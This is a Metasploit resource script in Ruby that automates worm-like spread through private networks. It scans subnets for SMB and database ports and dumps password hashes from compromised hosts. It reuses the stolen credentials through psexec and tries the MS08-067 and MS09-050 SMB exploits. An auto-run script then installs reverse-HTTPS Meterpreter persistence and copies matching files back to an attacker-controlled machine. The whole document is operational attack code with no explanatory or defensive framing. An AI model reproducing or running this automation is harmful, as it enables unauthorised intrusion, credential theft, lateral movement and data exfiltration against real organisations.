<ruby>

@p_c_local_ip = "192.168.152.1"

p_c_local_path = "/root/msfspread/"
@p_c_local_path = "D:\\\\\\\\acunetix2xD\\\\\\\\jf\\\\\\\\jf\\\\\\\\download\\\\\\\\"
p_c_remote_path = "c:\\\\\\\\"
p_c_file = "*fina1*"
@p_c_script = %Q|set AutoRunScript multi_console_command -cl '"run autoroute2","run persistence -S -i 5 -p 443 -P windows/meterpreter/reverse_https","run file_collector -r -d #{p_c_remote_path} -f #{p_c_file} -o #{@p_c_local_path}jjreplace.txt -i #{@p_c_local_path}jjreplace.txt -l #{@p_c_local_path}"'|

def is_hacked p_c_ip
	i_is_hacked = nil
	framework.sessions.each {|s| i_is_hacked = 1 if s.to_s[p_c_ip]}
	i_is_hacked
end

def is_looted p_c_ip
	i_is_looted = nil
	framework.db.creds.each {|s| i_is_looted = 1 if s.service.host.to_s[p_c_ip]}
	i_is_looted
end

@p_st_looker = {}

def is_looked p_c_ip
	i_is_looked = nil
	i_is_looked = 1 if @p_st_looker[p_c_ip] && Time.now.to_i < @p_st_looker[p_c_ip].to_i + 5 * 60
	print_good("i_is_looked = #{i_is_looked} #{p_c_ip} #{Time.now.to_i} < #{@p_st_looker[p_c_ip].to_i + 5 * 60}") if !i_is_looked
	i_is_looked
end

def look p_c_ip
	@p_st_looker[p_c_ip] = Time.now.to_i
	jj = p_c_ip[/\w+[.]\w+[.]\w+/] + ".0/24"
	jj = nil unless p_c_ip[/192[.]\w+[.]\w+/] || p_c_ip[/10[.]\w+[.]\w+/]
	
	if jj then
	run_single("use auxiliary/scanner/portscan/tcp")
	run_single("set rhosts #{jj}")
	run_single("set ports 445,1433,1521")
	run_single("set threads 10")
	run_single("run")
	sleep(4)
	run_single("use auxiliary/scanner/smb/smb_version")
	run_single("set rhosts #{jj}")
	run_single("set threads 10")
	run_single("run")
	end
end

def loot p_c_ip
	framework.sessions.each do |j|
		if j.to_s[p_c_ip] then
			run_single("use post/windows/gather/smart_hashdump")
			run_single("set getsystem 1")
        		run_single("set session #{j[0]}")
        		run_single("run -j")
		end
	end
end

def psexec p_c_ip
	framework.db.creds.each do |jj|
		run_single("use exploit/windows/smb/psexec")
		run_single("set rhost #{p_c_ip}")
		run_single("set service_filename zoom")
		run_single("set smbuser #{jj.user}")
		run_single("set smbpass #{jj.pass}")
		run_single(@p_c_script.gsub("jjreplace", p_c_ip))
		run_single("exploit -j")
	end
end

def netapi p_c_ip
	run_single("use exploit/windows/smb/ms08_067_netapi")
	run_single("set rhost #{p_c_ip}")
	run_single(@p_c_script.gsub("jjreplace", p_c_ip))
	run_single("exploit -j")
end

def negoti p_c_ip
	run_single("use exploit/windows/smb/ms09_050_smb2_negotiate_func_index")
	run_single("set rhost #{p_c_ip}")
	run_single("set rport 445")
	run_single("exploit -j")
end

	run_single("use exploit/multi/handler")
	run_single("set lhost #{@p_c_local_ip}")
	run_single("set lport 80")
	run_single("set payload windows/meterpreter/reverse_https")
	run_single("set ExitOnSession false")
	run_single(@p_c_script.gsub("jjreplace", "deleteme"))
	run_single("exploit -j")

while 1 == 1 do
	framework.db.hosts.each do |j|
		look(j.address) unless is_looked(j.address)
		sleep(5)
		loot(j.address) unless is_looted(j.address)
		sleep(20)
		psexec(j.address) unless is_hacked(j.address)
		sleep(20)
		netapi(j.address) if is_looked(j.address) && !is_hacked(j.address)
		negoti(j.address) if is_looked(j.address) && !is_hacked(j.address)
		sleep(5)
	end
end

</ruby>
